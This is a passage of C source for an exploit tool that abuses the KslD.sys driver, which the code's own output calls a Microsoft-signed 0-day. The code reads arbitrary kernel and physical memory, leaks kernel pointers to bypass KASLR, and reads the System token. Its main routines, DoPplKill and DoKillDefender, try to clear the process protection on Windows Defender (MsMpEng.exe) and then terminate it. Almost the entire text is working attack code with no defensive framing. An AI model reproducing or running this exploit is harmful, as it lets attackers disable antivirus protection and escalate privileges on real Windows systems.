            printf("[-] AHCI BAR detect failed: error %lu\n", GetLastError());
            CloseHandle(hDevice);
            return 1;
        }
    }

    printf("[3] Sub-cmd 0x11: MmMapIoSpace test read...\n");
    {
        KSLD_INPUT input = {0};
        input.SubCommand = SUBCMD_MMIO_READ;
        input.ProcessorIdx = 0;
        input.PhysAddress = 0xF0000;
        input.Size = 0x1000;

        memset(outBuf, 0, sizeof(outBuf));
        bytesReturned = 0;

        if (KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
            printf("[+] MMIO READ WORKS! Got %lu bytes from physical 0xF0000\n", bytesReturned);
            printf("[+] *** ARBITRARY PHYSICAL MEMORY READ CONFIRMED ***\n\n");
            HexDump(outBuf, bytesReturned < 64 ? bytesReturned : 64, 0xF0000);
        } else {
            printf("[-] MMIO read failed: error %lu\n", GetLastError());
        }
    }

    CloseHandle(hDevice);
    return 0;
}

int DoFullKaslr() {
    if (!OpenDevice()) return 1;

    printf("=== Comprehensive KASLR Bypass via CPU Register Dump ===\n\n");

    PVOID kernelBase = GetKernelBase();

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    printf("[*] System has %lu processors\n\n", si.dwNumberOfProcessors);

    BYTE outBuf[4096] = {0};

    for (DWORD cpu = 0; cpu < si.dwNumberOfProcessors; cpu++) {
        KSLD_INPUT input = {0};
        input.SubCommand = SUBCMD_CPU_REGS;
        input.ProcessorIdx = cpu;
        input.Size = 8;

        memset(outBuf, 0, sizeof(outBuf));
        DWORD bytesReturned = 0;

        if (!KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
            printf("[-] CPU %lu: failed (%lu)\n", cpu, GetLastError());
            continue;
        }

        printf("=== CPU %lu: %lu bytes ===\n", cpu, bytesReturned);

        ULONGLONG* regs = (ULONGLONG*)outBuf;
        int numRegs = bytesReturned / 8;

        for (int i = 0; i < numRegs; i++) {
            ULONGLONG v = regs[i];
            if ((v >> 40) == 0xFFFFF8 || (v >> 40) == 0xFFFFF6 ||
                (v >> 40) == 0xFFFFFA || (v >> 40) == 0xFFFF85 ||
                (v >> 40) == 0xFFFF80 || (v >> 40) == 0xFFFFC0) {
                printf("  [%2d] 0x%016llx  <-- KERNEL PTR\n", i, v);
            }
        }

        for (int i = 0; i < numRegs; i++) {
            ULONGLONG v = regs[i];
            if (v > 0 && v < 0x100000000ULL && (v & 0xFFF) == 0 && v != 0x1000) {
                printf("  [%2d] 0x%016llx  <-- possible CR3 (page table base)\n", i, v);
            }
        }
        printf("\n");
    }

    printf("=== Summary ===\n");
    printf("  ntoskrnl base (API): 0x%p\n", kernelBase);
    printf("  Leaked kernel pointers defeat KASLR.\n");
    printf("  CR3 value enables page table walks (with phys read primitive).\n");
    printf("  IDTR/GDTR bases reveal interrupt/GDT table locations.\n");
    printf("  KernelGSBase = KPCR address for each processor.\n");

    CloseHandle(hDevice);
    return 0;
}

int DoDump0x12() {
    if (!OpenDevice()) return 1;

    printf("[*] Dumping sub-command 0x12 output (4096 bytes)...\n\n");

    KSLD_INPUT input = {0};
    input.SubCommand = 0x12;
    input.ProcessorIdx = 0;
    input.Size = 4;

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;

    if (!KslD_SendIoctl(&input, sizeof(input), outBuf, sizeof(outBuf), &bytesReturned)) {
        printf("[-] Sub-cmd 0x12 failed: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Got %lu bytes\n\n", bytesReturned);

    printf("[*] First 256 bytes:\n");
    HexDump(outBuf, bytesReturned < 256 ? bytesReturned : 256, 0);

    ULONGLONG* qwords = (ULONGLONG*)outBuf;
    int numQ = bytesReturned / 8;
    printf("\n[*] Kernel pointers in output:\n");
    int kptrCount = 0;
    for (int i = 0; i < numQ; i++) {
        ULONGLONG v = qwords[i];
        if ((v >> 40) == 0xFFFFF8 || (v >> 40) == 0xFFFFF6 || (v >> 40) == 0xFFFFFA) {
            printf("  [%3d] offset 0x%03x: 0x%016llx\n", i, i*8, v);
            kptrCount++;
        }
    }
    if (kptrCount == 0) printf("  (none found)\n");

    DWORD* dwords = (DWORD*)outBuf;
    int numD = bytesReturned / 4;
    printf("\n[*] First 32 DWORDs:\n");
    for (int i = 0; i < 32 && i < numD; i++) {
        printf("  [%2d] 0x%08x", i, dwords[i]);
        if ((i & 3) == 3) printf("\n");
    }
    printf("\n");

    CloseHandle(hDevice);
    return 0;
}

BOOL WritePhysicalByte(ULONGLONG physAddr, BYTE value) {

    ULONGLONG pageBase = physAddr & ~0xFFFULL;
    ULONG pageOffset = (ULONG)(physAddr & 0xFFF);

    BYTE pageBuf[0x1000] = {0};
    DWORD bytesRead = 0;

    KSLD_INPUT readInput = {0};
    readInput.SubCommand = SUBCMD_MMIO_READ;
    readInput.PhysAddress = pageBase;
    readInput.Size = 0x1000;

    BOOL canRead = KslD_SendIoctl(&readInput, sizeof(readInput), pageBuf, 0x1000, &bytesRead);
    if (canRead && bytesRead >= 0x1000) {
        printf("[*] Read current page at phys 0x%llx (byte at offset 0x%x = 0x%02x)\n",
               pageBase, pageOffset, pageBuf[pageOffset]);
    }

    pageBuf[pageOffset] = value;

    BYTE writeBuf[sizeof(KSLD_INPUT) + 0x1000] = {0};
    KSLD_INPUT* writeInput = (KSLD_INPUT*)writeBuf;
    writeInput->SubCommand = SUBCMD_MMIO_WRITE;
    writeInput->PhysAddress = pageBase;
    writeInput->Size = 0x1000;
    memcpy(writeBuf + sizeof(KSLD_INPUT), pageBuf, 0x1000);

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
        writeBuf, sizeof(writeBuf),
        outBuf, sizeof(outBuf),
        &bytesReturned, NULL);

    if (ok) {
        printf("[+] MMIO write (sub-cmd 0x13) succeeded!\n");
        return TRUE;
    }

    DWORD err = GetLastError();
    printf("[-] MMIO write (sub-cmd 0x13) failed: error %lu\n", err);

    BYTE minBuf[32] = {0};
    KSLD_INPUT* writeInput2 = (KSLD_INPUT*)minBuf;
    writeInput2->SubCommand = SUBCMD_MMIO_WRITE;
    writeInput2->PhysAddress = physAddr;
    writeInput2->Size = 1;
    minBuf[sizeof(KSLD_INPUT)] = value;

    ok = KslD_SendIoctl((KSLD_INPUT*)minBuf, sizeof(minBuf), outBuf, sizeof(outBuf), &bytesReturned);
    if (ok) {
        printf("[+] MMIO write (minimal) succeeded!\n");
        return TRUE;
    }

    printf("[-] MMIO write fallback also failed: error %lu\n", GetLastError());
    return FALSE;
}

BOOL WritePhysicalDirect(ULONGLONG physAddr, BYTE value) {


    printf("[*] Attempting alternative write methods...\n");

    BYTE inBuf[64] = {0};
    *(ULONG*)inBuf = 0x08;
    *(ULONGLONG*)(inBuf + 8) = physAddr;
    *(ULONGLONG*)(inBuf + 16) = (ULONGLONG)value;

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
        inBuf, sizeof(inBuf), outBuf, sizeof(outBuf), &bytesReturned, NULL);

    if (ok) {
        printf("[+] Sub-cmd 0x08 returned OK (%lu bytes) — checking if write succeeded\n", bytesReturned);
        return TRUE;
    }

    printf("[-] Sub-cmd 0x08 failed: %lu\n", GetLastError());
    return FALSE;
}

UINT64 ResolveSymbol(const char* name) {
    WCHAR wname[256] = {0};
    MultiByteToWideChar(CP_ACP, 0, name, -1, wname, 256);
    DWORD stringByteLen = (DWORD)((wcslen(wname) + 1) * sizeof(WCHAR));

    BYTE inBuf[600] = {0};
    *(DWORD*)(inBuf + 0x00) = 0x07;
    *(DWORD*)(inBuf + 0x04) = stringByteLen;
    *(DWORD*)(inBuf + 0x08) = 0x0C;
    memcpy(inBuf + 0x0C, wname, stringByteLen);

    BYTE outBuf[16] = {0};
    DWORD br = 0;
    if (DeviceIoControl(hDevice, KSLD_IOCTL,
                        inBuf, 0x0C + stringByteLen,
                        outBuf, sizeof(outBuf), &br, NULL) && br >= 8) {
        return *(UINT64*)outBuf;
    }
    return 0;
}

BOOL KslMmCopyRead(UINT64 kernelAddr, PVOID outData, DWORD size) {
    BYTE buf[4096] = {0};
    *(DWORD*)(buf + 0x00) = 0x0C;
    *(DWORD*)(buf + 0x04) = 0;
    *(UINT64*)(buf + 0x08) = kernelAddr;
    *(UINT64*)(buf + 0x10) = (UINT64)size;
    *(DWORD*)(buf + 0x18) = 2;
    *(DWORD*)(buf + 0x1C) = 0;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                              buf, 0x20 + size, buf, 0x20 + size, &br, NULL);
    if (ok) {
        memcpy(outData, buf, size);
        return TRUE;
    }
    return FALSE;
}

BOOL KslMmCopyReadPhys(UINT64 physAddr, PVOID outData, DWORD size) {
    BYTE buf[4096] = {0};
    *(DWORD*)(buf + 0x00) = 0x0C;
    *(DWORD*)(buf + 0x04) = 0;
    *(UINT64*)(buf + 0x08) = physAddr;
    *(UINT64*)(buf + 0x10) = (UINT64)size;
    *(DWORD*)(buf + 0x18) = 1;
    *(DWORD*)(buf + 0x1C) = 0;

    DWORD br = 0;
    BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                              buf, 0x20 + size, buf, 0x20 + size, &br, NULL);
    if (ok) {
        memcpy(outData, buf, size);
        return TRUE;
    }
    return FALSE;
}

BOOL KslMmCopyWrite(UINT64 kernelAddr, PVOID inData, DWORD size) {
    BYTE buf[4096] = {0};
    DWORD br = 0;
    BOOL ok = FALSE;

    *(DWORD*)(buf + 0x00) = 0x0C;
    *(DWORD*)(buf + 0x04) = 0;
    *(UINT64*)(buf + 0x08) = kernelAddr;
    *(UINT64*)(buf + 0x10) = (UINT64)size;
    *(DWORD*)(buf + 0x18) = 2;
    memcpy(buf + 0x20, inData, size);

    ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                         buf, 0x20 + size, buf, 0x20 + size, &br, NULL);
    if (ok) { printf("    [write fmt1] ok! br=%lu\n", br); return TRUE; }

    memset(buf, 0, sizeof(buf));
    *(DWORD*)(buf + 0x00) = 0x0C;
    *(UINT64*)(buf + 0x08) = kernelAddr;
    *(UINT64*)(buf + 0x10) = (UINT64)size;
    *(DWORD*)(buf + 0x18) = 2;
    memcpy(buf + 0x1C, inData, size);

    ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                         buf, 0x1C + size, buf, 4096, &br, NULL);
    if (ok) { printf("    [write fmt2] ok! br=%lu\n", br); return TRUE; }

    BYTE inBuf2[32] = {0};
    *(DWORD*)(inBuf2 + 0x00) = 0x0C;
    *(UINT64*)(inBuf2 + 0x08) = kernelAddr;
    *(UINT64*)(inBuf2 + 0x10) = (UINT64)size;
    *(DWORD*)(inBuf2 + 0x18) = 2;

    BYTE outBuf2[4096] = {0};
    memcpy(outBuf2, inData, size);

    ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                         inBuf2, 32, outBuf2, size, &br, NULL);
    if (ok) { printf("    [write fmt3] ok! br=%lu\n", br); return TRUE; }

    BYTE shared[4096] = {0};
    *(DWORD*)(shared + 0x00) = 0x0C;
    *(UINT64*)(shared + 0x08) = kernelAddr;
    *(UINT64*)(shared + 0x10) = (UINT64)size;
    *(DWORD*)(shared + 0x18) = 2;
    memcpy(shared + 0x20, inData, size);

    ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                         shared, 4096, shared, 4096, &br, NULL);
    if (ok) { printf("    [write fmt4 shared] ok! br=%lu\n", br); return TRUE; }

    *(DWORD*)(shared + 0x18) = 3;
    ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                         shared, 4096, shared, 4096, &br, NULL);
    if (ok) { printf("    [write fmt5 dir=3] ok! br=%lu\n", br); return TRUE; }

    printf("    [write] all formats failed, err=%lu\n", GetLastError());
    return FALSE;
}

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION_T;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID    Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG    GrantedAccess;
    USHORT   CreatorBackTraceIndex;
    USHORT   ObjectTypeIndex;
    ULONG    HandleAttributes;
    ULONG    Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX_T;

UINT64 GetEprocessViaHandleTable(DWORD targetPid) {
    pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    DWORD myPid = GetCurrentProcessId();
    HANDLE myHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, myPid);
    if (!myHandle) {
        printf("[-] OpenProcess(self) failed: %lu\n", GetLastError());
        return 0;
    }
    ULONG_PTR myHandleVal = (ULONG_PTR)myHandle;

    ULONG bufSize = 16 * 1024 * 1024;
    BYTE* buf = NULL;
    NTSTATUS status;

    for (int retry = 0; retry < 8; retry++) {
        buf = (BYTE*)malloc(bufSize);
        if (!buf) { CloseHandle(myHandle); return 0; }

        status = NtQSI(64, buf, bufSize, NULL);
        if (status == (NTSTATUS)0xC0000004) {
            free(buf);
            buf = NULL;
            bufSize *= 2;
            continue;
        }
        break;
    }

    if (!buf || status != 0) {
        printf("[-] NtQuerySystemInformation(64) failed: 0x%08X\n", (UINT32)status);
        if (buf) free(buf);
        CloseHandle(myHandle);
        return 0;
    }

    SYSTEM_HANDLE_INFORMATION_EX_T* hi = (SYSTEM_HANDLE_INFORMATION_EX_T*)buf;
    printf("[*] Total handles (extended): %llu\n", (UINT64)hi->NumberOfHandles);

    USHORT processTypeIndex = 0;
    UINT64 myEprocess = 0;

    for (ULONG_PTR i = 0; i < hi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* e = &hi->Handles[i];
        if (e->UniqueProcessId == myPid && e->HandleValue == myHandleVal) {
            processTypeIndex = e->ObjectTypeIndex;
            myEprocess = (UINT64)e->Object;
            printf("[+] Process ObjectTypeIndex = %u\n", processTypeIndex);
            printf("[+] Own EPROCESS = 0x%016llX\n", myEprocess);
            break;
        }
    }

    CloseHandle(myHandle);

    if (!processTypeIndex) {
        printf("[-] Could not determine process type index\n");
        free(buf);
        return 0;
    }


    UINT64 targetEprocess = 0;

    HANDLE hSysProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, 4);
    if (hSysProc) {
        printf("[*] Searching System process handles for PID %lu...\n", targetPid);
        for (ULONG_PTR i = 0; i < hi->NumberOfHandles; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* e = &hi->Handles[i];
            if (e->ObjectTypeIndex != processTypeIndex) continue;
            if (e->UniqueProcessId != 4) continue;

            HANDLE hDup = NULL;
            if (DuplicateHandle(hSysProc,
                    (HANDLE)e->HandleValue,
                    GetCurrentProcess(), &hDup,
                    PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0)) {
                DWORD pid = GetProcessId(hDup);
                if (pid == targetPid) {
                    targetEprocess = (UINT64)e->Object;
                    CloseHandle(hDup);
                    printf("[+] Found! EPROCESS = 0x%016llX\n", targetEprocess);
                    break;
                }
                CloseHandle(hDup);
            }
        }
        CloseHandle(hSysProc);
    } else {
        printf("[-] Cannot open System process for DuplicateHandle: %lu\n", GetLastError());
    }

    if (!targetEprocess) {
        printf("[*] Fallback: scanning all process handles...\n");
        for (ULONG_PTR i = 0; i < hi->NumberOfHandles && !targetEprocess; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* e = &hi->Handles[i];
            if (e->ObjectTypeIndex != processTypeIndex) continue;
            if (e->UniqueProcessId == targetPid) continue;
            if (e->UniqueProcessId == myPid) continue;

            HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE, FALSE,
                                        (DWORD)e->UniqueProcessId);
            if (!hOwner) continue;

            HANDLE hDup = NULL;
            if (DuplicateHandle(hOwner, (HANDLE)e->HandleValue,
                                GetCurrentProcess(), &hDup,
                                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0)) {
                DWORD pid = GetProcessId(hDup);
                if (pid == targetPid) {
                    targetEprocess = (UINT64)e->Object;
                    CloseHandle(hDup);
                    CloseHandle(hOwner);
                    printf("[+] Found via PID %llu handle! EPROCESS = 0x%016llX\n",
                           (UINT64)e->UniqueProcessId, targetEprocess);
                    break;
                }
                CloseHandle(hDup);
            }
            CloseHandle(hOwner);
        }
    }

    free(buf);
    return targetEprocess;
}

int DoPplKill() {
    printf("=== KslD.sys PPL Kill — Full Exploit Chain ===\n\n");

    if (!OpenDevice()) return 1;
    EnablePrivilege("SeDebugPrivilege");

    printf("[*] Step 1: Resolving kernel symbols via sub-cmd 0x07...\n");
    UINT64 pPsInitialSystemProcess = ResolveSymbol("PsInitialSystemProcess");
    UINT64 pMmCopyVirtualMemory = ResolveSymbol("MmCopyVirtualMemory");
    UINT64 pPsGetProcessProtection = ResolveSymbol("PsGetProcessProtection");

    if (!pPsInitialSystemProcess) {
        printf("[-] Failed to resolve PsInitialSystemProcess\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] PsInitialSystemProcess  = 0x%016llX\n", pPsInitialSystemProcess);
    printf("[+] MmCopyVirtualMemory     = 0x%016llX\n", pMmCopyVirtualMemory);
    printf("[+] PsGetProcessProtection  = 0x%016llX\n", pPsGetProcessProtection);

    printf("\n[*] Step 2: Finding MsMpEng.exe...\n");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);
    DWORD defenderPid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "MsMpEng.exe") == 0) {
                defenderPid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (!defenderPid) {
        printf("[-] MsMpEng.exe not found.\n");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] MsMpEng.exe PID: %lu\n", defenderPid);

    printf("\n[*] Step 3: Getting EPROCESS via system handle table...\n");

    UINT64 defenderEprocess = GetEprocessViaHandleTable(defenderPid);


    if (!defenderEprocess) {
        printf("[-] Cannot determine EPROCESS address for MsMpEng.exe.\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] MsMpEng.exe EPROCESS = 0x%016llX\n", defenderEprocess);

    printf("\n[*] Step 4: Reading EPROCESS via MmCopyMemory (virtual read)...\n");

    UINT64 systemEprocess = 0;
    if (KslMmCopyRead(pPsInitialSystemProcess, &systemEprocess, 8) && systemEprocess > 0xFFFF000000000000ULL) {
        printf("[+] MmCopyMemory VIRTUAL READ WORKS!\n");
        printf("[+] System EPROCESS (from PsInitialSystemProcess) = 0x%016llX\n", systemEprocess);
        AutoDetectEprocessOffsets(systemEprocess);
    } else {
        printf("[-] Virtual read returned 0x%016llX\n", systemEprocess);
        printf("[*] Trying physical read (direction=1) on low memory...\n");
        BYTE physTest[16] = {0};
        if (KslMmCopyReadPhys(0x1000, physTest, 8)) {
            UINT64 val = *(UINT64*)physTest;
            printf("[*] Phys read 0x1000 = 0x%016llX\n", val);
        }
    }

    UINT64 protectionAddr = defenderEprocess + EPROCESS_PROTECTION;
    BYTE protection = 0;
    printf("\n[*] Reading Protection field at 0x%016llX...\n", protectionAddr);

    if (KslMmCopyRead(protectionAddr, &protection, 1) && protection != 0) {
        printf("[+] EPROCESS.Protection = 0x%02X\n", protection);
        printf("[+] PPL Type: %u, Signer: %u\n", protection & 0x07, (protection >> 4) & 0x0F);
        printf("[+] KERNEL VIRTUAL MEMORY READ CONFIRMED!\n");
    } else {
        printf("[*] Protection read returned 0x%02X\n", protection);
    }

    char imageName[16] = {0};
    KslMmCopyRead(defenderEprocess + EPROCESS_IMAGEFILENAME, imageName, 15);
    printf("[+] ImageFileName: %s\n", imageName);

    UINT64 readPid = 0;
    KslMmCopyRead(defenderEprocess + EPROCESS_UNIQUEPROCESSID, &readPid, 8);
    printf("[+] PID from EPROCESS: %llu (expected: %lu)\n", readPid, defenderPid);

    if (systemEprocess > 0xFFFF000000000000ULL) {
        printf("\n[*] Step 4b: Reading System token for token stealing...\n");
        UINT64 systemToken = 0;
        KslMmCopyRead(systemEprocess + EPROCESS_TOKEN, &systemToken, 8);
        printf("[+] System Token = 0x%016llX\n", systemToken);

        UINT64 myEprocess = 0;
    }

    printf("\n[*] Step 5: Clearing PPL Protection...\n");

    typedef NTSTATUS (NTAPI *pNtSystemDebugControl)(
        ULONG Command, PVOID InputBuffer, ULONG InputBufferLength,
        PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength);

    typedef struct _SYSDBG_VIRTUAL {
        PVOID Address;
        PVOID Buffer;
        ULONG Request;
    } SYSDBG_VIRTUAL;

    pNtSystemDebugControl NtSysDbg = (pNtSystemDebugControl)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSystemDebugControl");

    BOOL writeSuccess = FALSE;

    if (NtSysDbg) {
        printf("[*] Method 1: NtSystemDebugControl(SysDbgWriteVirtual)...\n");
        BYTE writeVal = 0x00;
        SYSDBG_VIRTUAL dbgWrite = {0};
        dbgWrite.Address = (PVOID)protectionAddr;
        dbgWrite.Buffer = &writeVal;
        dbgWrite.Request = 1;

        NTSTATUS st = NtSysDbg(9, &dbgWrite, sizeof(dbgWrite), NULL, 0, NULL);
        printf("    NTSTATUS: 0x%08X\n", (UINT32)st);

        if (st == 0) {
            printf("[+] NtSystemDebugControl write succeeded!\n");
            writeSuccess = TRUE;
        } else {
            printf("[-] NtSystemDebugControl denied (0x%08X)\n", (UINT32)st);
        }
    }

    if (!writeSuccess) {
        printf("[*] Method 3: MmCopy reverse direction...\n");
        BYTE zero = 0;
        KslMmCopyWrite(protectionAddr, &zero, 1);
    }

    Sleep(100);
    BYTE newProt = 0xFF;
    KslMmCopyRead(protectionAddr, &newProt, 1);
    printf("[+] Protection after write attempts: 0x%02X\n", newProt);

    if (newProt == 0x00) {
        printf("\n[+] ==========================================\n");
        printf("[+]   PPL CLEARED!\n");
        printf("[+] ==========================================\n\n");

        printf("[*] Step 6: Terminating PID %lu...\n", defenderPid);
        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, defenderPid);
        if (hProc) {
            if (TerminateProcess(hProc, 1)) {
                Sleep(500);
                printf("\n[+] ==========================================\n");
                printf("[+]   PROCESS KILLED! PPL BYPASSED!\n");
                printf("[+]   KslD.sys 0-day (Microsoft-signed)\n");
                printf("[+] ==========================================\n");
            } else {
                printf("[-] TerminateProcess failed: %lu\n", GetLastError());
            }
            CloseHandle(hProc);
        }
    } else {
        printf("[-] PPL still active (Protection=0x%02X).\n", newProt);
        printf("\n=== VULNERABILITY CONFIRMED (read-only) ===\n");
        printf("[+] KslD.sys (Microsoft-signed) provides:\n");
        printf("    - KASLR bypass\n");
        printf("    - Arbitrary kernel symbol resolution\n");
        printf("    - Arbitrary kernel virtual memory READ\n");
        printf("[+] Read from EPROCESS:\n");
        printf("    System EPROCESS  = 0x%016llX\n", systemEprocess);
        printf("    Defender EPROCESS = 0x%016llX\n", defenderEprocess);
        printf("    Protection = 0x%02X (PPL-WinTcb)\n", protection);

        UINT64 sysToken = 0;
        KslMmCopyRead(systemEprocess + EPROCESS_TOKEN, &sysToken, 8);
        printf("    System Token = 0x%016llX\n", sysToken);

        printf("\n[-] Write primitive not available. KslD.sys is read-only.\n");
        printf("[-] PPL kill requires a separate write driver.\n");
    }

    CloseHandle(hDevice);
    return 0;
}

int DoKillDefender() {
    printf("=== Defender Kill via KslD.sys Physical Memory Access ===\n\n");
    printf("[*] Strategy: Scan physical RAM -> Find EPROCESS -> Clear PPL -> Kill\n\n");

    printf("[Step 1] Locating Windows Defender (MsMpEng.exe)...\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD defenderPid = 0;
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(snap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "MsMpEng.exe") == 0) {
                    defenderPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    if (!defenderPid) {
        printf("[-] MsMpEng.exe not found. Defender may not be running.\n");
        return 1;
    }
    printf("[+] MsMpEng.exe found: PID %lu\n", defenderPid);

    printf("\n[Step 2] Attempting direct termination (expected to fail)...\n");
    HANDLE hDefender = OpenProcess(PROCESS_TERMINATE, FALSE, defenderPid);
    if (hDefender) {
        if (TerminateProcess(hDefender, 1)) {
            printf("[+] TerminateProcess SUCCEEDED! (Defender was not PPL-protected)\n");
            CloseHandle(hDefender);
            return 0;
        }
        printf("[-] TerminateProcess failed: %lu (PPL blocks termination)\n", GetLastError());
        CloseHandle(hDefender);
    } else {
        DWORD err = GetLastError();
        printf("[-] OpenProcess(PROCESS_TERMINATE) failed: %lu\n", err);
        if (err == 5)
            printf("[*] ACCESS_DENIED: MsMpEng.exe is PPL-protected\n");
    }

    printf("\n[Step 3] Opening KslD device...\n");
    if (!OpenDevice()) {
        printf("[-] Cannot open KslD device. Need admin + exe named MsMpEng.exe.\n");
        return 1;
    }

    printf("\n[Step 4] Getting kernel info...\n");
    PVOID kernelBase = GetKernelBase();

    printf("\n[Step 5] Scanning physical memory for EPROCESS of PID %lu...\n", defenderPid);
    printf("[*] Scanning up to 2GB of physical RAM (this may take a moment)...\n\n");

    BYTE page[0x1000];
    ULONGLONG defenderEprocessPhys = 0;
    BYTE defenderProtection = 0;
    ULONGLONG systemTokenPhys = 0;
    ULONGLONG systemToken = 0;
    ULONGLONG defenderTokenPhys = 0;
    int totalFound = 0;

    for (ULONGLONG phys = 0x1000; phys < 0x80000000ULL; phys += 0x1000) {
        DWORD readBytes = 0;
        if (!ReadPhysicalMemory(phys, page, 0x1000, &readBytes) || readBytes < 0x1000)
            continue;

        for (ULONG off = 0; off + EPROCESS_IMAGEFILENAME + 16 < 0x1000; off += 8) {
            char* imgName = (char*)(page + off + EPROCESS_IMAGEFILENAME);

            BOOL validName = FALSE;
            for (int i = 0; i < 15; i++) {
                if (imgName[i] == 0) { if (i >= 3) validName = TRUE; break; }
                if (imgName[i] < 0x20 || imgName[i] > 0x7e) break;
            }
            if (!validName) continue;

            ULONG64 pid = *(ULONG64*)(page + off + EPROCESS_UNIQUEPROCESSID);
            if (pid == 0 || pid > 100000) continue;

            ULONG64 token = *(ULONG64*)(page + off + EPROCESS_TOKEN);
            ULONG64 tokenPtr = token & ~0xFULL;
            if ((tokenPtr >> 48) != 0xFFFF) continue;

            ULONG64 flink = *(ULONG64*)(page + off + EPROCESS_ACTIVEPROCESSLINKS);
            if ((flink >> 48) != 0xFFFF) continue;

            BYTE prot = *(BYTE*)(page + off + EPROCESS_PROTECTION);
            totalFound++;

            if (pid == (ULONG64)defenderPid) {
                defenderEprocessPhys = phys + off;
                defenderProtection = prot;
                defenderTokenPhys = phys + off + EPROCESS_TOKEN;
                printf("[+] *** FOUND MsMpEng.exe EPROCESS ***\n");
                printf("    Physical address : 0x%llx\n", defenderEprocessPhys);
                printf("    PID              : %llu\n", pid);
                printf("    Token            : 0x%llx\n", tokenPtr);
                printf("    Protection       : 0x%02x", prot);
                if (prot == 0x61) printf(" (WinTcb-Light = PPL)");
                else if (prot == 0x72) printf(" (WinSystem-Light)");
                else if (prot == 0x00) printf(" (NONE - not protected)");
                printf("\n");
                printf("    Protection phys  : 0x%llx\n\n",
                       defenderEprocessPhys + EPROCESS_PROTECTION);
            }

            if (pid == 4 && memcmp(imgName, "System", 6) == 0) {
                systemTokenPhys = phys + off + EPROCESS_TOKEN;
                systemToken = tokenPtr;
                printf("[+] System EPROCESS at physical 0x%llx (Token: 0x%llx)\n",
                       phys + off, tokenPtr);
            }
        }

        if ((phys & 0x0FFFFFFF) == 0 && phys > 0) {
            printf("[*] Scanned %llu MB... (found %d processes)\n",
                   phys / (1024*1024), totalFound);
        }
    }

    if (!defenderEprocessPhys) {
        printf("[-] Could not find MsMpEng.exe EPROCESS in physical memory.\n");
        printf("[*] Physical memory read may not be working (plugin not initialized).\n");
        printf("[*] Try: MsMpEng.exe --check  (to verify sub-commands work)\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[Step 6] Attempting to clear PPL protection...\n");
    printf("[*] Target: physical 0x%llx (EPROCESS.Protection)\n",
           defenderEprocessPhys + EPROCESS_PROTECTION);
    printf("[*] Current value: 0x%02x -> Writing 0x00\n\n", defenderProtection);

    if (defenderProtection == 0x00) {
        printf("[*] Protection is already 0x00 — no PPL. Proceeding to terminate.\n");
    } else {
        ULONGLONG protPhys = defenderEprocessPhys + EPROCESS_PROTECTION;

        BOOL writeOk = WritePhysicalByte(protPhys, 0x00);

        if (!writeOk) {
            writeOk = WritePhysicalDirect(protPhys, 0x00);
        }

        if (!writeOk) {
            printf("\n[-] All write methods failed.\n");
